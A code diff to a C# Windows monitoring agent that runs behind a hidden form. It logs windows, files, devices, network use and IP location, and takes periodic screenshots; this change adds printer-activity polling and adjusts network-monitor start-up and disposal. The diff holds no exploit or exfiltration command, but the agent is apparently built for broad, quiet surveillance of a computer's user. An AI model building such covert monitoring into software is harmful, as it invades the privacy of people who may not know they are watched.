@@ -16,6 +16,7 @@ public sealed class AgentContext : ApplicationContext
     private static readonly TimeSpan NetworkPollInterval = TimeSpan.FromSeconds(30);
     private static readonly TimeSpan ScreenshotInterval = TimeSpan.FromMinutes(10);
     private static readonly TimeSpan LocationPollInterval = TimeSpan.FromMinutes(60);
+    private static readonly TimeSpan PrinterPollInterval = TimeSpan.FromSeconds(15);
 
     private readonly ActivityLogger _logger = new();
     private readonly Form _hiddenForm;
@@ -27,12 +28,14 @@ public sealed class AgentContext : ApplicationContext
     private readonly NetworkUsageMonitor _networkMonitor;
     private readonly DeviceActivityMonitor _deviceMonitor;
     private readonly IpLocationMonitor _locationMonitor;
+    private readonly PrinterActivityMonitor _printerMonitor;
 
     private readonly System.Windows.Forms.Timer _idleTimer;
     private readonly System.Windows.Forms.Timer _windowTimer;
     private readonly System.Windows.Forms.Timer _networkTimer;
     private readonly System.Windows.Forms.Timer _screenshotTimer;
     private readonly System.Windows.Forms.Timer _locationTimer;
+    private readonly System.Windows.Forms.Timer _printerTimer;
 
     public AgentContext()
     {
@@ -59,14 +62,17 @@ public sealed class AgentContext : ApplicationContext
         _networkMonitor = new NetworkUsageMonitor(_logger);
         _deviceMonitor = new DeviceActivityMonitor(_logger);
         _locationMonitor = new IpLocationMonitor(_logger);
+        _printerMonitor = new PrinterActivityMonitor(_logger);
 
         _deviceMonitor.Start();
+        _networkMonitor.Start();
 
         _idleTimer = StartTimer(IdlePollInterval, (_, _) => CheckIdleState());
         _windowTimer = StartTimer(WindowPollInterval, (_, _) => _windowMonitor.Poll());
-        _networkTimer = StartTimer(NetworkPollInterval, (_, _) => _networkMonitor.Poll());
+        _networkTimer = StartTimer(NetworkPollInterval, (_, _) => _networkMonitor.Flush());
         _screenshotTimer = StartTimer(ScreenshotInterval, (_, _) => _screenshotCapture.CaptureNow());
         _locationTimer = StartTimer(LocationPollInterval, async (_, _) => await _locationMonitor.PollAsync());
+        _printerTimer = StartTimer(PrinterPollInterval, (_, _) => _printerMonitor.Poll());
 
         // Fire one location lookup immediately at startup too, don't wait a full hour
         _ = _locationMonitor.PollAsync();
@@ -130,9 +136,11 @@ public sealed class AgentContext : ApplicationContext
         _networkTimer.Stop();
         _screenshotTimer.Stop();
         _locationTimer.Stop();
+        _printerTimer.Stop();
 
         _fileMonitor.Dispose();
         _deviceMonitor.Dispose();
+        _networkMonitor.Dispose();
 
         _logger.Log("agent_stopped");
         _hiddenForm.Dispose();
